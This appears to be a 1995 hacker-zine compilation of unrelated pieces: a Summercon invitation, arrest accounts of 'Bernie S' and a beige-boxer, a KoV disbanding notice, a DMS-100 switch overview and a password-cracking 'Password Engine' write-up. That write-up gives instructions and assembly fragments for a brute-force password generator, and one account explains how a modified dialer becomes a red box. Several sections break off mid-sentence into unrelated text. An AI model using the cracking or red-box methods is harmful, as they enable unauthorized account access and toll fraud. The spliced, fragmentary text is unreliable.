                               "SUMMERCON"

      June 2-4 1995 @ the Downtown Clarion Hotel in Atlanta, Georgia

This is the official announcement and open invitation to the 1995
incarnation of Summercon.  In the past, Summercon was an invite-only
hacker gathering held annually in St. Louis, Missouri.  Starting
with this incarnation, Summercon is open to any and all interested
parties:  Hackers, Phreaks, Pirates, Virus Writers, System Administrators,
Law Enforcement Officials, Neo-Hippies, Secret Agents, Teachers,
Disgruntled Employees, Telco Flunkies, Journalists, New Yorkers,
Programmers, Conspiracy Nuts, Musicians and Nudists.

LOCATION:

The Clarion Hotel is located in downtown Atlanta, 9 miles from
Hartsfield International Airport and just a few blocks from the
Peachtree Center MARTA Station.


Considering the exorbitant expenses involved with attending other
conferences of this type, Rooms at Summercon are reduced to

                $65 per night for Single or Double Occupancy

      The Clarion Hotel Downtown, Courtland at 70 Houston St., NE,
                           Atlanta, GA 30303
       (404) 659-2660 or (800) 241-3828   (404) 524-5390 (fax)


No one likes to pay a hundred dollars a night.  We don't expect you
to have to.  Spend your money on room service, drinks in the hotel bar,
or on k-rad hacker t-shirts.  Remember:  Mention that you are attending
Summercon in order to receive the discount.

DIRECTIONS

75/85 Southbound - Exit 97 (Courtland).  Go 3 blocks south on Courtland
          then turn left on Houston (John Wesley Dobbs Ave.)
20 East - Exit 75/85 North at International.  Turn Left on Courtland at
          Houston Ave. NE. (aka. John Wesley Dobbs Ave. NE.)
20 West - Exit 75/85 North at International.  One block to Courtland
          and right at Houston Ave. NE. (John Wesley Dobbs Ave. NE.)

Atlanta Airport Shuttle - The Express Bus that leaves from Atlanta's
International Airport will drop you off at many hotels in the downtown
area, including the Clarion.  The shuttle should be no more than 12
dollars.  Fares may be paid at the Airport Shuttle in the Ground
Transportation area of the Airport Terminal.

MARTA - The Metropolitan Atlanta Rapid Transit Authority (MARTA), is a
convenient and inexpensive way to negotiate most of the Atlanta area.
Take the MARTA train from the Airport to the Peach Tree Center Station.
Walk three blocks down Houston to the intersection of Houston and
Courtland.  The MARTA fare will be roughly 2 dollars.

Taxis - The average cab fare from Atlanta's Airport to the downtown area
is roughly 30 dollars.

CONFERENCE INFO

It has always been our contention that cons are for socializing.
"Seekret Hacker InPh0" is never really discussed except in private
circles, so the only way anyone is going to get any is to meet new people
and take the initiative to start interesting conversations.

Because of this, the formal speaking portion of Summercon will be
held on one day, not two or three, leaving plenty of time for people
to explore the city, compare hacking techniques, or go trashing and
clubbing with their heretofore unseen online companions.

The "Conference" will be held on June 3rd from roughly 11:00 am until
6:00 pm with a 1 hour lunch break from 1:00 to 2:00.

NO VIDEO TAPING WILL BE ALLOWED IN THE CONFERENCE ROOM.  Audio Taping
and still photography will be permitted.


CURRENT LIST OF SPEAKERS:

Robert Steele   - Ex-Intelligence Agent, Founder and CEO of Open Source
                  Solutions (a private sector intelligence firm)

           Topic: Hackers from the Intelligence Perspective

Winn Schwartau  - Author of "Information Warfare" and "Terminal Compromise",
                  Publisher of Security Insider Report, and noted security
                  expert

Chris Goggans   - Editor of Phrack Magazine and Summercon M.C.

           Topic: introductions, incidentals and a topic which is sure
                  to culminate in an international incident.


(Other Speakers May Be Added - Interested parties may contact scon@fc.net)

COSTS

Since other cons of this type have been charging from 25 to 40 dollars
entry fees, we are only charging 10 dollars.  Yes, that's correct,
TEN (10) dollars in US currency.  Money is far too scarce among the
hacker community to fleece everyone for money they will probably need
to eat with or pay for their hotel rooms.


WHAT TO DO IN ATLANTA:

To attempt to make everyone's stay in Atlanta more exciting, we are
contacting local establishments to arrange for special discounts and/or
price reductions for Summercon attendees.  Information will be handed
out regarding these arrangements at the conference.

Atlanta is a happening town.

UNAUTHORIZED ACCESS

"Unauthorized Access [is] a documentary that tells the story of the
computer underground from our side, it captures the hacker world
from Hamburg to Los Angeles and virtually everywhere in between."
                                        2600  The Hacker Quarterly

Computers are becoming an integral part of our everyday existence.
They are used to store and send a multitude of information, from
credit reports and bank withdrawals, to personal letters and highly
sensitive military documents.  So how secure are our computer
systems?

The computer hacker is an expert at infiltrating secured systems,
such as those at AT&T, TRW, NASA or the DMV.  Most computer systems
that have a telephone connection have been under siege at one time
or another, many without their owner's knowledge.  The really good
hackers can reroute the telephone systems, obtain highly sensitive
corporate and government documents, download individual's credit
reports, make free phone calls globally, read private electronic
mail and corporate bulletins and get away without ever leaving a
trace.

So who are these hackers?  Just exactly WHAT do they do and WHY do
they do it?  Are they really a threat?  What do they DO with the
information that they obtain?  What are the consequences of their
actions? Are hackers simply playing an intellectual game of chess
or are hackers using technology to fight back and take control of
a bureaucratic system that has previously appeared indestructible?

Unauthorized Access is a documentary that demistifies the hype and
propaganda surrounding the computer hacker.  Shot in 15 cities
and 4 countries, the film hopes to expose the truths of this subculture
focusing on the hackers themselves.

Unauthorized Access is a view from inside the global underground.

CONFERENCE OVERVIEW:

The  Information  Warfare Conference (InfoWarCon)  is  our third
international  conference  dedicated to the  exchange  of  ideas,
policies,  tactics, weapons, methodologies and defensive  posture
of Information Warfare on a local, national, and global basis.

InfoWarCon will bring together international experts from a broad
range  of disciplines to discuss and integrate concepts  in  this
rapidly  evolving field.  Attendees will intensely interact  with
the  speakers  and presenters as well as each other  to  increase
each other's understanding of the interrelatedness of the topics.

While  there are many interpretations of Information  Warfare  by
different groups, the current working definition we employ is:

     Information  Warfare is the use of information and  informa
     tion systems as weapons in a conflict where information  and
     information systems are the targets.

Information  Warfare  is broken down into three  categories,  and
InfoWarCon speakers and attendees will interactively examine them
all:

     Class  I:  Personal Privacy.  "In Cyberspace You Are  Guilty
     Until Proven Innocent."  The mass psychology of information.
     Privacy versus stability and law enforcement.

     Class  II: Industrial and Economic Espionage.  Domestic  and
     international  ramifications  and  postures  in  a  globally
     networked, competitive society.

     Class III: Global Information Warfare.  Nation-state  versus
     Nation-state  as an alternative to convention  warfare,  the
     military perspective and terrorism.

THE CONFERENCE

The  conference  is designed to be interactive -  with  extensive
interaction  between all participants. The  preliminary  contents

    Ed Cummings, also known to many in cyberspace as "Bernie S" was arrested
on March 13th, 1995 for 2 misdemeanors of possession, manufacture and sale
of a device to commit Telecommunications fraud charges. He is being held in
Delaware County Prison in lieu of $100,000.00 Bail. His story follows.

    On the evening of the 13th Bernie S. received a page from his mail drop.
Some people he knew from Florida had stopped in at his mail drop thinking
it was his address.  They were looking to purchase several 6.5 Mhz Crystals.
These crystals when used to replace the standard crystal in the RADIO SHACK
Hand Telephone dialer, and with some programming, produce tones that trick
pay phones into believing they have received coins.  These are commonly
referred to as "red boxes" and got their name from an actual red box pulled
from a pay phone in the late seventies by some curious person.

    Ed Cummings met these people at a local 7-11 (which 7-11?) where he was
to sell the widely used electronic timing crystals for roughly $4 a piece.
The purchaser only had two twenty dollar bills and Ed Cummings no change.
Ed Cummings went into the 7-11 to get some change to make the transaction.
A police officer noticed a van parked in the parking lot of the 7-11 with
more several African Americans inside.  As Ed was leaving the 7-11 he noticed
fifteen police cars pulling into the parking lot of the 7-11.

    Next thing he knew the police were asking him if they could `rifle`
through his car.  He said no.  Moments later as he was talking to a Detective
and noticed another police officer going through his car.  He asked the officer
to stop.  They did not, in all the police confiscated a few hundred 6.5Mhz
crystals (which he resells for roughly $4 a piece) and a large box of 100
dialers.  The police told him they would get back to him,  and he could have
his electronics back if the contents of the bag were legal.  In the contents
of the seized items was one modified dialer, that a customer returned after
modification explaining that it did not work, a broken red box.

    The next day Ed `Bernie S.` Cummings was over at a friend`s house working
on their computer when eight to ten plain clothed armed men burst into the
house and ordered him and his friends to freeze.  They cuffed him and took him
to a holding cell (what jail?).  There he was left without a blanket or jacket
to sleep with in the cold cell.

    That evening the Secret Service had been called in when someone figured
out what the dialers and crystals would do when put together.  The
United States Secret Service found his home and entered it, while they were
questioning him.

    The next morning at his arraignment he was finally told of the charges
he was being held upon. They were Two misdemeanor Charges of manufacture,
Distribution and Sale of devices of Telecommunications Fraud. and Two Unlawful
use of a computer charges. His bail was automatically set to $100,000.00
because Ed Cummings refused talk with the police without his attorney present.

    The Secret Service presented to the judge a 9 page inventory of what
they had found in his home.   On that inventory there 14 computers. 2 printers.
more Boxes of bios chips for the systems he worked with. Eprom burners which
the Federal Agents had labeled "Cellular telephone chip reprogramming adapters"
Eproms are used in everything from Automobile computers to personal computers.
They also confiscated his toolbox of screw drivers, wire clippers and other
computer oriented tools he used for his consulting job.

    The Judge dropped the Two unlawful use of a computer charges due to
the fact that the evidence was circumstantial and the county had no actual
evidence that Ed had ever used the computers in question.

    As of 3/27/1995 Ed Cummings is still in Delaware County Prison

"Don't believe the hype."  -  Public Enemy, 1988

This file's purpose is to clear up any misconceptions about the recent
situation that has come upon the sociopolitical group known as KoV.

As it stands now, (10:55 PM EST on 1/29/95), NO ONE has been busted for
ANYTHING. We have received several tip-offs from private sources regarding
a supposed "FBI investigation" of our group that is purported to be active
at this very minute. However, with the exception of a few VERY suspicious
incidents and coincidences, there has been NO HARD EVIDENCE thus far about
ANYONE getting busted for ANYTHING. So while we are EXTREMELY concerned for
the integrity of our innocence, we must stress that nothing has gone down.

Yet.

We have very good reason to believe that a few of those among us are about
to be charged with various false accusations by a local university. However
the current mental state of the person in charge of this charade is also in
question. Therefore it would be logical to assume nothing. The conflicting
tip-offs, rumors, warnings and threats that we have received make it even
more difficult to get a clear picture of exactly what is going on. We have
heard so many things from so many different sources, both credible and
questionable, that we would be hard-pressed to give an accurate evaluation
of the current state of things.

What we can say for sure, however, is that KoV officially died on Monday,
January 23, 1995, along with its communications network, KoVNet. This
promises to be a great loss to the open-minded and sociopolitical community
as well as the free-thinkers and activists who supported us so generously.
Our reasons for disbanding the group were many, but the foremost was in
light of the current situation we are facing.

Consider this last obstacle our final, stalwart stand against the evils of
AmeriKKKan government and its various greedy, capitalistic agencies.
From the moment of KoV's conception, they have publicly sought to destroy
us; to silence our questioning of authority, to oppress our free-thinking
minds, and to close off our intellectual channels of communication. They
have even gone so far as to stalk us in public places. 'Tis a shame indeed.

If you have any questions or if you wish to contact us for any reason,
you may email sgolem@pcnet.com with the subject or header of "ATTN: KoV".
I will try to post further updates of this saga to CiPNet, ThrashNet,
QuantumNet, InsanityNet, ScumNet, FizzNet, NukeNet and any others I can.
We would appreciate any support that other h/p, art or political groups can
lend us. Until then, my friends...

                What happens when you are caught beige boxing.

                        by Rush 2


        Yeah yeah, I'm the only one.  But here is a generally interesting
     description of everything to getting caught to arraignment.

        Well about 5 months ago i needed to set up a conference really quick..
     it was about 12:00  (never knew there was a 10:00 pm curfew in that area)
     and went to a 25 pair box at this local strip mall.  Well I was out there
     the box was already open and I was just about to start testing pairs to
     see which was connected and what wasn't.

        All of a sudden, i hear this loud screeching sound of a car coming
     to a skid from doing about 90mph.  I turned and saw that typically dirty
     squad car about to hit me.. you know the car, mud and dust on the tires
     and body, coffee and smudge marks all over the windshield.  i got on my
     bike and started to run.  Now the thing is I COULD have gotten away.. the
     pathetic excuse for a cop had run not more than 10 yards after me and
     decided that I was a threat so he pulled his handgun and yelled.  I saw
     this and thought it would be wiser to stop than get shot.

        Within 2 minutes at LEAST 10 squad cars had come to his aide.. i did
     not know i was less than a half mile from a police station and they were
     looking for a prowler in the general area.  The police did the normal,
     called me scum, asked me what i was doing, searched me until they were
     satisfied...  than picked me up and threw me in the car... the funny
     thing was they didn't see my phone until they threw me into the back seat
     and the cord fell out.. (they never saw the page of notes and 'naughty'
     material in my pocket though it was about 4 inches thick and sticking out
     that a blind man could see it.

        Well they got me to the station and pried my info out, and called my
     father... I came up with a good enough story about some made up user
     who told me to go across the street and plug in..  then I was told I
     would be dealt with in the next week...  I did not receive anything for
     three and a half months.

        Once the time came for the arraignment (for a juvenile they called it
     an intake).  I got to go to the police station, sit for about 3 hours (as
     if i thought they would be on time) until I waited for my probation
     officer. Finally she got there and we proceeded to talk.  She explained
     all of the charges and my lawyer (interesting guy) laughed, I was being
     charged with prowling (could be disputed I was on a public sidewalk and
     there in that strip mall is a 24 hr laundry mat), loitering (again that
     could be disputed), and attempted theft of services (though I NEVER even
     plugged in).

        After this was all said i spent the next hour talking with the lady
     in private.  I immediately found she had an interest in computers and was
     having a problem with her home pc.  So I easily changed the topic to my
     fascination in computers and solved her problem with her computer, and
     answered at least 50 questions about them.  In the last 10-15 minutes of
     the conversation all i could get from her were statements about how
     impressed and how intrigued she was with me.  She ended up giving me a
     look (that was hard to judge but i am staying away from this chick) that
     was either confusion or attraction, slipped me a card with her home phone
     number and name and called back in my lawyer and parents.

        Once they got back in, all that she really said was I was a great boy,
     that she would like to see me do more with my time besides computers, and
     that she was taking my sentence of 12 months formal probation with 300
     hours of community service to 3 months of informal probation with 30
     hours of community service.  That and she said bell was asking her what
     to do and she would tell them that it was a non issue since I did not
     plug in and even if I had it would not be their concern unless I had
     plugged in to the telco access part of the network interface.

        Well I have yet to receive official record of having to perform
     the community service or the probation but I called my probation officer
     yesterday and said she wasn't putting the community service into the
     punishment and it has been an equivalent amount of time to just say that
     since I haven't gotten in trouble since she will count the probation as
     already served.  Luckily she based all other needs of me on the report
     from a teacher, and with my luck she picked the one teacher, my computers
     teacher, that no matter what I did or said would lie and say I didn't.


        Thanks to erikb for publishing this, and greets to CXrank, paradox,
     dark phiber, the fat cop (who spilled his coffee and box of donuts
     coming after me) that made this all possible,  and to everyone else.

P A S S W O R D   E N G I N E  (for IBM PC's)                by Uncle Armpit
+++++++++++++++++++++++++++++++++++++++++++++

   The device driver code listed below provides a data stream of passwords.
The device driver approach was used to speed up the process
of cracking passwords on an incremental basis. The usual approach was
to generate the passwords to a file, then reading the file, etc..the device
driver approach circumvents these file storage problems, and others, such as
having enough free disk space and delays from disk i/o.
    This driver operates completely in memory (approx. 0.5Kb)

How practical is this?
----------------------
This program would be very useful if you think you may know what strategy
the user/admin uses for picking out their passwords.  Without eliciting some
sort of a strategy, forget it-- unless your desperate enough!!


A "strategy" could consist of any of these possible advantages--

1) default passwords (ie: SIN, student #, birth date, phone number...)
2) the mutation of a lUSERs' known password from another system
3) viewing the mark typing in most of their password with a couple
   of unseen characters
4) etc...

---------------------------
  With the sample device driver provided, passwords starting at
'aaaaaaa' and ending with 'zzzzzzz' will be generated.  The length
of the password string can be modified by changing the length of
the password string itself (that is, the variable "number").  The
range of characters in the passwords can also be changed by
modifying the following two lines:

;hackdrv.sys
;.
;.
;
for ending character--
cmp byte ptr [number+si],'z'+1 ;+1 past ending char. in range

...and for starting character
cmp byte ptr [number+si],'a'   ;starting char. in range
;
;----------------------

for instance, if you wished to generate numbers from "0000000" to
"9999999"

-change the ending character to:
cmp byte ptr [number+si],'9'+1

-starting character to:
cmp byte ptr [number+si],'0'

and "number" variable from 'aaaaaa' to '0000000' and then
recompile..

-----

 ..or in the third case, if u had observed a lUSER type in most of
their password, you may want to rewrite the code to limit the
search.  IE: limit the keys to a certain quadrant of the keyboard.
   Modify the code starting at "reiterate:"  and ending at "inc_num
endp" for this.
=================================================================


/'nuff of this!/   How do I get things working?
-----------------------------------------------

Compile the device driver "hackdrv.sys", and the second program,
"modpwd.asm". Then specify the device driver inside config.sys
(ie: "c:\hackdrv.sys").  The code below was compiled with the a86
compiler, v3.03.  Some modifications might be needed to work with
other compilers.

To use it in prgs like crackerjack, type in the following on the
command line:


c:\>jack -pwfile:<your password file here!> -word:hackpwd

------
 If you had stopped a cracker program (eg: crackerjack) and want to
pick up from where you left off, run the program "modpwd.com".

 This program can change HACKDRVs password through-

 a) a command line argument (ie: "modpwd aabbbbe")
 b) executing the program with no parameters (this method also
    displays the current password in memory)



                                                   Happy Hacking,
                                                   Uncle Armpit

 See the difference between system's SYMBIONT processes ( i.e. SYMBIONT_4,
 SYMBIONT_6, SMTP_SYMBIONT ) and the one created by using a `stealth' program
 ( SYMBIONT_0001 ); the names and the User Identification Codes may vary, but
 state, priority, physical memory used, page faults, input/output and Process
 IDentification numbers, can reveal, in combination, such a nastyness.

 Afterwards you may " show process /id=xxxx /continuous ",
 or " stop /id=xxxx ".

Compaq CEO blunders on TV

          Compaq CEO Eckard Pfeiffer last week visited The Netherlands
          to do some pr work. During a television interview for NOVA,
          a well known news show that aired last Friday, Pfeiffer
          claimed that pc's were easy to use, and could be used by
          virtually anyone. So, the reporter asked him to switch the
          tv channel on a Presario that was next to Pfeiffer that ran
          a Windows-based TV tuner. The result was Pfeifer frantically
          clicking on several menu bars, but instead of switching
          channels, he exited the program altogether. To make things
          worse, the reporter next asked him to start up a word
          processor.  Again, Pfeiffer, clicked his way around the
          desktop, but couldn't find nor start the program. Finally,
          he was asked to start up a game. You saw Pfeifer (now in
          deep trouble) clicking on all the tabs of the "easy to use"
          tab-works interface that is included on all Presario's,
          looking for games, while muttering "Were are ze games? I
          can't find ze games on zis machine!!!", his accent becoming
          increasingly more German then before. It was almost like Dr.
          Strangelove. The last shot is of a Compaq tech support guy,
          rushing in to help him out....  So much for ease of use....

Ok, I'm going to assume that you already know a little bit about what it
is you're reading.  The DMS100/IBN (integrated business network) is
composed of mainly electronic business sets, phones, data units, and
attendant consoles and units, all physically at the customers place of
business.  While the digital switching software and support hardware is
located at the Telco.  Together, in tandem they work to give the customer
one of the best combinations of features and benefits.  The DMS-100
combines voice AND data in one business comunications package.  One of
the many advantages is it offers the use with *any* sized business with
up to 30,000 lines.  The IBN system controls most operations, diagnoses
problems, and also has the ability to do limited repairs on itself.
Being modular, it can meet the needs at hand, and have the ability for
new features, as time goes by, while still maintaining a cost-effective
environment.  Another advantage is that is uses a central attendant where
and when needed.  Along with Call Routing, or CDR, to control and
restrict Long Distnace Calling, and network management.  The IBN gives
the user hassle free operation.  Northern Telcom's DMS-100 switches,
which by the way are digital, are frequently backed-up by their
*higher trained* personnel, which isnt saying much.  Some other features
are: Automatic Routing Selection, or ARS, which routes the long distance
calls, if they are even allowed, over the most economical (right) route
available.  Station Message Detail Recording, or SMDR, which basically
does just what its name states, records long distance charges, including
but not limited to, originating number, time and length of call,
authorization code, and others...  Yet another capability is the Direct
Inward System Access (DISA), which gives the personnel the ability to use
the system to place long distance calls cheaply, even from outside the
company (sounds like a PBX a bit doesn't it?).
System Features and Benefits:  There are 6 Call Waiting Lamp Loop Keys,
each with its associated source AND destination lamp to signify the
status of both the calling and the called party status.  The Second
feature is Alpha Numeric Display Multiple Directory Number Feature Keys,
up to 42 of them, which can be used for a Paging System, or speed
dialing, and things along those lines.  A third feature is the release
Source/Release Destination Console, which features access to paging.
Other features which mainly are unimportant I will list here, they are:
Call Identifier Exclude Source/Exclude Destination.  Remote Console Call
Destination.  Signal Source.Signal Destination.  Call Holding.  Call
Detail Entry.  Remote Console Call Selection.  Console Display.  Camp-on
Automatic Recall Conference.  A 6 port 2 way splitting non-delayed
operation.  Busy Verification of Lines.  Manual and Automatic Hold.
Multiple Console OPeration.  Busy verification of trunks. Switched Loop
Operation.  Trunk Group Busy Indication.  Uniform Call distribution form
queue.  Multiple listed directory numbers.  Control of trunk group
access.  Secrecy.  Night Service.  Serial call.  Speed Calling.  Lockout.
 Delayed Operation.  Position Busy.  Interposition Calling.  THrough Call
Pickup.  RIng Again.  Multiple Directory Numbers.  Intercom.  Speed
Call.  Call Transfer/Conference.  On-Hook Dialing.  Additional
Programmable Features include automatic hold.  Listem-on hold.  Multiple
Appearance Directory Numbers, or MADN.  Single Call Arrangement.
Multiple Call Arrangement.  Privacy Release.  Tone Ringing with Volume
Control.  Call Waiting.  Stored Number Redial.  Private Business Line.
And Finally a 32 character alphanumeric data unit.  The DMS100/IBN can be
used as a "standalone" or can be attached to the business set or other
phone type unit.  It has the ability to transmit over a two wire loop, at
speeds of up to 56 kb per second, using a proprietary time compression
multiplexing technology.  The DMS100 is also available in different
models to suit existing terminal capacities.  It also provides integrated
voice/data, that right data, communications.  They, the phone company,
and data unit, can operate together, simultaniously, or even independant
of one another.  Being fully digitized, it was one if the first switches
to eliminate the use of those dinosaur analog modems (for which i still
have a few if anyone wants to buy em off me or give me shipping money and
ill send em to ya free).  Well thats it for now.  This should give you a
good understanding of the capabilities of one of the many switches in use
today.  In fact, although outdated somewhat, my telco, citizens
utilities, and one in stockton from what i just found out, is still using
this switch (poor me in elk grove, ca eh?)
which makes phreaking quite an easy task, not that it was really ever
hard but anything to make it easier help.  ANyway, if you have any
comments/flames/general bullshit, mail it to either
jmatrix@mindvox.phantom.com or capthook@sekurity.com the latter being a
last resort email address.
ciao
